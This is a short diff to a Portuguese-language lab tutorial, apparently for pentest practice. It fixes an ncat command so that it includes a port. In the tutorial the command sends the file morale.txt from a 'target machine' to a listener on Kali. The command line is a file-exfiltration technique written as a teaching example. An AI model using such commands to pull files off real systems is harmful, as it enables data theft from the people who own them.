@@ -58,7 +58,7 @@ Este comando irá abrir e ficar escutando a porta 1337 da máquina local
 
 Máquina Alvo:
 ```
-ncat IP < morale.txt
+ncat IP PORT < morale.txt
 ````
 O comando ira se conectar com o Kali e enviará o arquivo morale.txt após conexão.
 
